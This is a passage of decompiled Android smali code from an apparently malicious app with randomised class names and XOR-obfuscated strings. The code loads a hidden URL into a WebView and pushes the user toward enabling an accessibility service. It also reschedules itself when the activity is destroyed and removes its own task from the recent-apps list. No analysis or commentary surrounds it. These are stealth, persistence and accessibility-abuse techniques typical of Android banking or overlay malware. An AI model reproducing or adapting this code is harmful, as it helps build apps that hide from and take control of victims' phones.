    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    invoke-direct {p0, p1}, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->k(Landroid/content/Context;)V

    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->g:Ljava/lang/String;

    new-array v0, v5, [B

    fill-array-data v0, :array_24

    new-array v1, v3, [B

    fill-array-data v1, :array_25

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_1b

    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->g:Ljava/lang/String;

    new-array v0, v3, [B

    fill-array-data v0, :array_26

    new-array v1, v3, [B

    fill-array-data v1, :array_27

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_1b

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    new-array v0, v5, [B

    fill-array-data v0, :array_28

    new-array v1, v3, [B

    fill-array-data v1, :array_29

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->g:Ljava/lang/String;

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    iput-object p1, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->g:Ljava/lang/String;

    :cond_1b
    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->g:Ljava/lang/String;

    invoke-virtual {p1, v0}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    invoke-static {p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/bq;->a(Landroid/content/Context;)V

    :goto_c
    return-void

    nop

    :array_0
    .array-data 1
        -0x51t
        -0x17t
        -0x37t
        -0x79t
        0x8t
        0x12t
        -0x3ft
        -0x22t
    .end array-data

    :array_1
    .array-data 1
        0x7dt
        -0x31t
        -0x25t
        -0x20t
        0x71t
        0x1et
        0x79t
        -0x57t
        0x6ft
        -0x3ct
        -0x35t
        -0x1at
        0x77t
        0x19t
        0x7at
        -0xct
        0x32t
        -0x14t
        -0x2t
        -0x24t
        0x5ft
        0x30t
        0x58t
        -0x28t
        0x5dt
        -0xft
        -0x11t
        -0x33t
        0x5ft
        0x3bt
        0x51t
        -0x28t
        0x5at
        -0x18t
        -0xdt
        -0x29t
        0x4dt
        0x28t
        0x5ct
        -0x3ct
        0x5ft
        -0x1ct
        -0x14t
        -0x3ft
        0x41t
        0x27t
        0x58t
        -0x2bt
        0x51t
        -0x18t
        -0x14t
        -0x3ft
        0x57t
        0x38t
        0x53t
    .end array-data

    :array_2
    .array-data 1
        0x1ct
        -0x5ft
        -0x41t
        -0x6et
        0x1et
        0x77t
        0x1dt
        -0x79t
    .end array-data

    :array_3
    .array-data 1
        0x6at
        0x3bt
        -0x67t
        0x60t
        -0xbt
        0x4t
        0x7ct
    .end array-data

    :array_4
    .array-data 1
        0x1at
        0x5at
        -0x6t
        0xbt
        -0x6ct
        0x63t
        0x19t
        0x5dt
    .end array-data

    :array_5
    .array-data 1
        -0x75t
        -0x4dt
        -0x7et
        0x5ft
        -0x2t
        -0x20t
        -0x20t
        -0x39t
    .end array-data

    :array_6
    .array-data 1
        -0x16t
        -0x30t
        -0xat
        0x36t
        -0x78t
        -0x77t
        -0x6ct
        -0x42t
    .end array-data

    :array_7
    .array-data 1
        0x66t
        0x3et
        0x6at
        0x74t
        0x2at
        -0x12t
        0x6et
        0x5dt
    .end array-data

    :array_8
    .array-data 1
        0x7t
        0x5dt
        0x1et
        0x1dt
        0x5ct
        -0x79t
        0x1at
        0x24t
    .end array-data

    :array_9
    .array-data 1
        0x58t
        -0x5bt
        -0x5dt
        -0x51t
    .end array-data

    :array_a
    .array-data 1
        0xft
        -0x2at
        -0x40t
        -0x23t
        -0x33t
        0x40t
        0x70t
        0x9t
    .end array-data

    :array_b
    .array-data 1
        0x19t
        0x1at
        0x56t
        0x58t
    .end array-data

    :array_c
    .array-data 1
        0x51t
        0x69t
        0x35t
        0x2at
        0x64t
        -0x2t
        0x1dt
        0x5et
    .end array-data

    :array_d
    .array-data 1
        -0x59t
        0x7ft
    .end array-data

    nop

    :array_e
    .array-data 1
        -0x12t
        0x3bt
        0x5t
        -0xet
        0x59t
        -0x58t
        -0x4at
        0x1ct
    .end array-data

    :array_f
    .array-data 1
        0x37t
        -0x55t
    .end array-data

    nop

    :array_10
    .array-data 1
        0x7et
        -0x11t
        0x4bt
        0x40t
        -0x67t
        -0x65t
        0x10t
        -0x4dt
    .end array-data

    :array_11
    .array-data 1
        0x4bt
        0xbt
    .end array-data

    nop

    :array_12
    .array-data 1
        0x31t
        0x63t
        0x3ft
        -0x39t
        -0x76t
        -0x71t
        0x61t
        0x2dt
    .end array-data

    :array_13
    .array-data 1
        0x5t
        -0x27t
    .end array-data

    nop

    :array_14
    .array-data 1
        0x71t
        -0x55t
        -0x6t
        -0x62t
        0xdt
        -0x61t
        -0xat
        0x4t
    .end array-data

    :array_15
    .array-data 1
        -0x4bt
        0x59t
    .end array-data

    nop

    :array_16
    .array-data 1
        -0x30t
        0x37t
        -0x73t
        -0x59t
        0x5dt
        0x49t
        0x6et
        0x8t
    .end array-data

    :array_17
    .array-data 1
        -0x49t
        -0x33t
    .end array-data

    nop

    :array_18
    .array-data 1
        -0x2at
        -0x41t
        0x55t
        -0x37t
        -0x1et
        -0x55t
        0x30t
        0x7ft
    .end array-data

    :array_19
    .array-data 1
        -0x10t
        0x12t
        -0x55t
        -0x4ft
        0x5t
        0x20t
        -0x5bt
        0x75t
        -0x10t
        0x18t
        -0x1t
        -0x8t
        0x8t
        0x3bt
        -0x52t
        0x69t
        -0x5t
        0x1et
        -0x1t
        -0x4ft
        0x4t
        0x3at
        -0x20t
        0x63t
        -0x5t
        0x9t
        -0x12t
        -0x45t
        0x1ft
        0x31t
        -0x5ct
        0x29t
        -0x6ct
        0x77t
        -0x55t
        -0x58t
        0x7t
        0x31t
        -0x5ft
        0x74t
        -0x5t
        0x5dt
        -0x18t
        -0x49t
        0x5t
        0x3at
        -0x5bt
        0x64t
        -0x16t
        0x5dt
        -0x1t
        -0x49t
        0x4bt
        0x3dt
        -0x52t
        0x73t
        -0x5t
        0xft
        -0x1bt
        -0x43t
        0x1ft
        0x74t
        -0x5ft
        0x69t
        -0x6t
        0x5dt
        -0x1t
        -0x56t
        0x12t
        0x74t
        -0x5ft
        0x60t
        -0x1t
        0x14t
        -0x1bt
    .end array-data

    :array_1a
    .array-data 1
        -0x62t
        0x7dt
        -0x75t
        -0x28t
        0x6bt
        0x54t
        -0x40t
        0x7t
    .end array-data

    :array_1b
    .array-data 1
        0x2ft
        -0x5ft
        -0x69t
        -0x14t
        0x27t
        0x38t
        0x18t
        -0x2et
        0x66t
        -0x53t
        -0x7et
        0x4dt
        -0x36t
        0x3at
        0x1ct
        -0x38t
        0x32t
        0xbt
        0x52t
        -0x6t
        -0x6ft
        -0x19t
        0x5dt
        -0x39t
        0x2at
        -0x58t
        0x27t
        0x38t
        0x39t
        0x37t
        0x13t
        -0x35t
        0x27t
        -0x55t
        0x27t
        0x38t
        0x7bt
        0x5ct
        0x77t
        -0x7at
        0x2at
        0xct
        0x5ft
        -0x3t
        0x33t
        0x33t
        0x13t
        -0x7at
        0x2ft
        -0x5ft
        -0x69t
        -0x14t
        0x27t
        0x38t
        0x18t
        -0x2et
        0x23t
        -0x11t
        -0x7ft
        -0x18t
        -0x6ft
        -0x37t
        0x11t
        -0x39t
        0x28t
        0xbt
        0x52t
        -0x19t
        0x75t
        0x20t
        0x18t
        -0x7at
        0x32t
        -0x56t
        -0x78t
        -0x5t
        0x34t
        0x24t
        0x5dt
        -0x3et
        0x23t
        -0x5ft
        -0x7at
        -0x10t
        0x3ct
        0x38t
    .end array-data

    nop

    :array_1c
    .array-data 1
        0x46t
        -0x31t
        -0x1dt
        -0x77t
        0x55t
        0x56t
        0x7dt
        -0x5at
    .end array-data

    :array_1d
    .array-data 1
        0x1ct
        -0x8t
        -0x4at
        0x59t
        0x1t
        -0x71t
        -0xft
        -0x22t
        0x71t
        -0x7ft
        -0x6ct
        0xft
        -0x7et
        0x46t
        0x79t
        0x1ft
        -0x61t
        0x16t
        0x72t
        -0x26t
        -0x2at
        0x2ft
        -0x1t
        -0x2ct
        0x64t
        -0x7et
        -0x6et
        0x1at
        0x41t
        -0x71t
        -0x6bt
        0x61t
        -0x10t
        0x44t
        -0xct
        0x10t
        0x15t
        -0x19t
        -0x58t
        -0xbt
        0x1ct
        -0x16t
        -0x47t
        0x5at
        0x2at
        -0x41t
        0x37t
        0x22t
        -0x6ct
        0x10t
        0x79t
        -0x33t
        -0x34t
        0x6at
        0x63t
        0x4bt
        0x1ft
        -0x23t
        -0x56t
        0x56t
        0x25t
        -0x7et
        -0x1t
        -0x3ct
        0x6ft
    .end array-data

    nop

    :array_1e
    .array-data 1
        -0x6t
        0x64t
        0x1ct
        -0x41t
        -0x5et
        0xft
        0x17t
        0x6bt
    .end array-data

    :array_1f
    .array-data 1
        0x1ft
        -0x19t
        0x9t
        -0x2dt
        0x7at
        -0x72t
        0x44t
        -0xft
        0x6ct
        -0x46t
        0x55t
        0x76t
        -0x7et
        -0x10t
        0x17t
        -0x53t
        0x1ft
        -0x20t
        0x8t
        -0x1et
        -0x7dt
        -0x2at
        -0x12t
        -0xft
        0x7ft
        -0x46t
        0x56t
        0x76t
        -0x7et
        -0x10t
        0x16t
        -0x7dt
        0x1et
        -0x2at
        0x8t
        -0xft
        -0x7dt
        -0x2dt
        -0x12t
        -0xft
        0x6et
        -0x45t
        0x77t
        -0x71t
        -0x22t
        -0x71t
        0x6bt
        -0x10t
        0x40t
        -0x45t
        0x7at
        -0x72t
        -0x15t
        -0x72t
        0x48t
        -0xft
        0x6ct
        0x43t
        -0x2t
        0x5ct
        0x50t
        0x77t
        0x16t
        -0x72t
        0x1ft
        -0x19t
        0x8t
        -0x19t
        -0x7et
        -0x5t
        0x16t
        -0x72t
        0x1et
        -0x3et
        -0x10t
        -0x72t
        -0x3t
        -0x72t
        0x4at
        -0xft
        0x61t
        -0x45t
        0x7at
        -0x72t
        -0x11t
        -0x71t
        0x69t
        -0x10t
        0x42t
        0x43t
        0x8t
        -0x2t
        -0x7et
        -0x10t
        0x17t
        -0x53t
        0x1et
        -0x3at
        0x9t
        -0x30t
        -0x7et
        -0x3t
        0x16t
        -0x68t
        0x1ft
        -0x1bt
        0x8t
        -0x4t
        0x7at
        -0x72t
        0x46t
        -0xft
        0x61t
        -0x46t
        0x54t
        -0x71t
        -0x21t
        -0x71t
        0x63t
        -0xft
        0x61t
        -0x46t
        0x58t
        -0x71t
        -0x22t
        -0x71t
        0x67t
        0x9t
        0x1ft
        -0x1at
        0x8t
        -0x19t
        -0x7et
        -0x2t
        -0x12t
        -0xft
        0x65t
        -0x45t
        0x7et
        -0x72t
        -0x15t
        -0x72t
        0x47t
    .end array-data

    :array_20
    .array-data 1
        -0x3at
        0x63t
        -0x30t
        0x56t
        0x5at
        0x57t
        -0x32t
        0x29t
    .end array-data

    :array_21
    .array-data 1
        0x51t
        0x7at
        -0x5bt
        -0x40t
        0x51t
        -0x3at
        0x4dt
        -0x62t
        0x71t
        0x70t
        -0xft
        -0x77t
        0x5ct
        -0x23t
        0x46t
        -0x7et
        0x7at
        0x76t
        -0xft
        -0x40t
        0x50t
        -0x24t
        0x8t
        -0x78t
        0x7at
        0x61t
        -0x20t
        -0x36t
        0x4bt
        -0x29t
        0x4ct
        -0x3et
        0x15t
        0x1ft
        -0x5bt
        -0x27t
        0x53t
        -0x29t
        0x49t
        -0x61t
        0x7at
        0x35t
        -0x1at
        -0x3at
        0x51t
        -0x24t
        0x4dt
        -0x71t
        0x6bt
        0x35t
        -0xft
        -0x3at
        0x1ft
        -0x25t
        0x46t
        -0x68t
        0x7at
        0x67t
        -0x15t
        -0x34t
        0x4bt
        -0x6et
        0x49t
        -0x7et
        0x7bt
        0x35t
        -0xft
        -0x25t
        0x46t
        -0x6et
        0x49t
        -0x75t
        0x7et
        0x7ct
        -0x15t
    .end array-data

    :array_22
    .array-data 1
        0x1ft
        0x15t
        -0x7bt
        -0x57t
        0x3ft
        -0x4et
        0x28t
        -0x14t
    .end array-data

    :array_23
    .array-data 1
        0x3bt
        0x65t
        -0x16t
        0x55t
        -0x25t
        -0x4at
        -0x7at
        0x28t
    .end array-data

    :array_24
    .array-data 1
        -0x61t
        -0x3t
        0x4ct
        -0x46t
        -0x63t
        0x52t
        -0x6bt
    .end array-data

    :array_25
    .array-data 1
        -0x9t
        -0x77t
        0x38t
        -0x36t
        -0x59t
        0x7dt
        -0x46t
        0x17t
    .end array-data

    :array_26
    .array-data 1
        -0x45t
        -0x7ft
        0x20t
        0x20t
        -0x70t
        -0x58t
        0x5et
        -0xat
    .end array-data

    :array_27
    .array-data 1
        -0x2dt
        -0xbt
        0x54t
        0x50t
        -0x1dt
        -0x6et
        0x71t
        -0x27t
    .end array-data

    :array_28
    .array-data 1
        0x2dt
        0x5dt
        0x37t
        -0x5ft
        0x8t
        -0x3at
        0x15t
    .end array-data

    :array_29
    .array-data 1
        0x45t
        0x29t
        0x43t
        -0x2ft
        0x32t
        -0x17t
        0x3at
        0xat
    .end array-data
.end method

.method protected onDestroy()V
    .locals 5

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->k(Landroid/content/Context;)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    const-wide/16 v3, 0x3a98

    add-long/2addr v1, v3

    const-class v3, Lcom/vknnolqo/p9sv5zvf/GJhyvSVC;

    invoke-static {v0, v3, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/j2;->a(Landroid/content/Context;Ljava/lang/Class;J)V

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 1

    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onRequestPermissionsResult(I[Ljava/lang/String;[I)V

    const/16 v0, 0x16

    if-ne p1, v0, :cond_0

    const/4 p1, 0x0

    :goto_0
    array-length v0, p2

    if-ge p1, v0, :cond_0

    aget v0, p3, p1

    add-int/lit8 p1, p1, 0x1

    goto :goto_0

    :cond_0
    return-void
.end method

.method protected onRestoreInstanceState(Landroid/os/Bundle;)V
    .locals 1

    invoke-super {p0, p1}, Landroid/app/Activity;->onRestoreInstanceState(Landroid/os/Bundle;)V

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    if-eqz v0, :cond_0

    invoke-virtual {v0, p1}, Landroid/webkit/WebView;->restoreState(Landroid/os/Bundle;)Landroid/webkit/WebBackForwardList;

    :cond_0
    return-void
.end method

.method protected onResume()V
    .locals 6

    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    const-class v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ba;->b(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    const/4 v1, 0x1

    const/16 v2, 0x8

    if-nez v0, :cond_0

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/BuZckswr;->Use_Access:Ljava/lang/String;

    new-array v3, v1, [B

    const/4 v4, 0x0

    const/16 v5, -0x10

    aput-byte v5, v3, v4

    new-array v4, v2, [B

    fill-array-data v4, :array_0

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    new-instance v0, Landroid/content/Intent;

    const-class v3, Lcom/vknnolqo/p9sv5zvf/OKPcLYfw;

    invoke-direct {v0, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    :cond_0
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sget-object v3, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->o:Ljava/lang/String;

    sget-object v4, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v0, v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_2

    new-array v0, v2, [B

    fill-array-data v0, :array_1

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager;

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0}, Landroid/app/ActivityManager;->getAppTasks()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :cond_1
    :goto_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_2

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/app/ActivityManager$AppTask;

    invoke-virtual {v3}, Landroid/app/ActivityManager$AppTask;->getTaskInfo()Landroid/app/ActivityManager$RecentTaskInfo;

    move-result-object v4

    invoke-static {v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/r1;->a(Landroid/app/ActivityManager$RecentTaskInfo;)Landroid/content/ComponentName;

    move-result-object v4

    if-eqz v4, :cond_1

    invoke-virtual {v3}, Landroid/app/ActivityManager$AppTask;->getTaskInfo()Landroid/app/ActivityManager$RecentTaskInfo;

    move-result-object v4

    invoke-static {v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/r1;->a(Landroid/app/ActivityManager$RecentTaskInfo;)Landroid/content/ComponentName;

    move-result-object v4

    invoke-virtual {v4}, Landroid/content/ComponentName;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_1

    invoke-virtual {v3, v1}, Landroid/app/ActivityManager$AppTask;->setExcludeFromRecents(Z)V

    goto :goto_0

    :cond_2
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sget-object v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->n:Ljava/lang/String;

    sget-object v2, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_3

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    :cond_3
    return-void

    :array_0
    .array-data 1
        -0x3ft
        -0x4ft
        -0x73t
        0x65t
        -0x66t
        0x7t
        0x20t
        -0x52t
    .end array-data

    :array_1
    .array-data 1
        -0x64t
        -0x18t
        0x24t
        0x4t
        0x56t
        -0x1bt
        -0x72t
        0x21t
    .end array-data

    :array_2
    .array-data 1
        -0x3t
        -0x75t
        0x50t
        0x6dt
        0x20t
        -0x74t
        -0x6t
        0x58t
    .end array-data
.end method

.method protected onSaveInstanceState(Landroid/os/Bundle;)V
    .locals 1

    invoke-super {p0, p1}, Landroid/app/Activity;->onSaveInstanceState(Landroid/os/Bundle;)V

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    if-eqz v0, :cond_0

    invoke-virtual {v0, p1}, Landroid/webkit/WebView;->saveState(Landroid/os/Bundle;)Landroid/webkit/WebBackForwardList;

    :cond_0
    return-void
.end method
